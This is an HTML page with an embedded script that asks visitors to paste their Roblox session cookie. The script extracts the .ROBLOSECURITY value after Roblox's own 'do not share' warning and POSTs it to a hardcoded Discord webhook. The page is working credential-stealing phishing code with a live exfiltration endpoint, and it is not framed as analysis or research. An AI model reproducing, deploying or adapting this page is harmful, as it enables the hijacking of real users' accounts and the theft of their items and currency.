<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cookie Submission</title>
  <style>
    body {
      background: #2c2f38;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }
    .container {
      background: rgba(255,255,255,0.1);
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
    }
    input[type="text"] {
      width: 80%;
      padding: 10px;
      border-radius: 8px;
      border: none;
      background: #3a3f47;
      color: #fff;
      margin-bottom: 10px;
    }
    button {
      background: #ff5e5e;
      border: none;
      padding: 10px 20px;
      color: #fff;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #e55a5a;
    }
    .status-message {
      margin-top: 10px;
      min-height: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Paste Cookie String</h1>
    <input type="text" id="cookieInput" placeholder='Paste full string here'>
    <button onclick="sendMessage()">Submit</button>
    <div class="status-message" id="statusMessage"></div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1367593880861806602/j2nUxJofoMKaEc032py78vCjysveQe2gw1rMmcxRt0M09IHji3QRsEKpwkR6N2QE7Rtf";

    function sendMessage() {
      const input = document.getElementById('cookieInput').value.trim();
      const statusMsg = document.getElementById('statusMessage');

      const warningPart = "_^|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.^|_\"";

      const startIdx = input.indexOf(warningPart);
      if (startIdx === -1) {
        statusMsg.textContent = '❗ Could not find valid cookie string.';
        statusMsg.style.color = '#ff5e5e';
        return;
      }

      const afterWarning = input.substring(startIdx + warningPart.length);
      const endIdx = afterWarning.indexOf(';');
      const cookie = endIdx !== -1 ? afterWarning.substring(0, endIdx) : afterWarning;

      const finalMessage = warningPart + cookie + '"';

      fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: finalMessage })
      })
      .then(() => {
        statusMsg.textContent = '✅ Cookie sent!';
        statusMsg.style.color = '#56ff89';
      })
      .catch(() => {
        statusMsg.textContent = '❌ Failed to send.';
        statusMsg.style.color = '#ff5e5e';
      });
    }
  </script>
</body>
</html>
